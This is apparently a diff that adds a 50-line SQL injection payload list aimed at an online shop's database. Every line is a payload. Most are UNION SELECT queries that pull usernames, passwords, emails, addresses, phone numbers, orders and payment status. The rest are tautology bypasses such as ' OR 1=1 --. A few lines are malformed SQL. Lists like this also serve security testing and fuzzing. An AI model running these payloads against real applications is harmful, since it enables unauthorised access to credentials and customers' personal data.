@@ -1,0 +1,50 @@
+' OR 1=1 --
+' OR 'a'='a' --
+' UNION SELECT NULL, username, password FROM users --
+' UNION SELECT NULL, product_name, price FROM products --
+' UNION SELECT NULL, first_name, last_name FROM customers --
+' UNION SELECT NULL, order_id, total_amount FROM orders --
+' AND 1=1 --
+' AND 'a'='a' --
+' UNION SELECT NULL, email, password FROM users --
+' UNION SELECT NULL, product_id, stock_quantity FROM products --
+' AND 1=1 LIMIT 1 --
+' UNION SELECT NULL, category_name, description FROM product_categories --
+' UNION SELECT NULL, user_id, order_status FROM orders WHERE user_id=1 --
+' OR 1=1 AND SELECT * FROM users --
+' UNION SELECT NULL, username, email FROM users WHERE role='admin' --
+' UNION SELECT NULL, product_name, price FROM products WHERE category_id=5 --
+' UNION SELECT NULL, address, phone_number FROM customers WHERE user_id=1 --
+' UNION SELECT NULL, product_id, price FROM products WHERE product_id=100 --
+' AND 1=1 LIMIT 1,1 --
+' UNION SELECT NULL, order_id, total_amount FROM orders WHERE order_status='shipped' --
+' UNION SELECT NULL, order_id, total_amount FROM orders WHERE user_id=2 --
+' UNION SELECT NULL, product_name, price FROM products WHERE price < 100 --
+' UNION SELECT NULL, category_name, description FROM product_categories WHERE category_id=3 --
+' OR 1=1 AND SELECT database() --
+' UNION SELECT NULL, first_name, last_name FROM customers WHERE email='admin@admin.com' --
+' UNION SELECT NULL, product_name, price FROM products WHERE price > 500 --
+' UNION SELECT NULL, user_id, order_status FROM orders WHERE order_id=1000 --
+' UNION SELECT NULL, product_name, description FROM products WHERE product_id=10 --
+' UNION SELECT NULL, order_id, total_amount FROM orders WHERE order_id=5 --
+' UNION SELECT NULL, product_name, stock_quantity FROM products WHERE product_id=20 --
+' UNION SELECT NULL, first_name, last_name FROM customers WHERE email='customer@example.com' --
+' UNION SELECT NULL, product_name, description FROM products WHERE category_id=2 --
+' UNION SELECT NULL, order_id, order_status FROM orders WHERE user_id=3 --
+' UNION SELECT NULL, product_name, price FROM products WHERE product_id=30 --
+' UNION SELECT NULL, user_id, payment_status FROM payments WHERE user_id=1 --
+' UNION SELECT NULL, product_id, price FROM products WHERE product_name LIKE '%laptop%' --
+' UNION SELECT NULL, order_id, total_amount FROM orders WHERE user_id=4 --
+' UNION SELECT NULL, product_name, stock_quantity FROM products WHERE stock_quantity < 10 --
+' UNION SELECT NULL, user_id, email FROM users WHERE role='admin' --
+' UNION SELECT NULL, order_id, total_amount FROM orders WHERE user_id=5 AND order_status='delivered' --
+' UNION SELECT NULL, product_name, description FROM products WHERE product_id=15 --
+' UNION SELECT NULL, product_id, stock_quantity FROM products WHERE product_name='camera' --
+' UNION SELECT NULL, product_name, description FROM products WHERE category_id=4 --
+' UNION SELECT NULL, username, password FROM users WHERE user_id=10 --
+' UNION SELECT NULL, order_id, total_amount FROM orders WHERE order_status='cancelled' --
+' UNION SELECT NULL, product_name, price FROM products WHERE price BETWEEN 50 AND 100 --
+' UNION SELECT NULL, user_id, payment_status FROM payments WHERE user_id=6 --
+' UNION SELECT NULL, order_id, payment_method FROM orders WHERE order_id=200 --
+' UNION SELECT NULL, category_name, description FROM product_categories WHERE category_id=1 --
+' UNION SELECT NULL, product_name, stock_quantity FROM products WHERE stock_quantity > 100 --
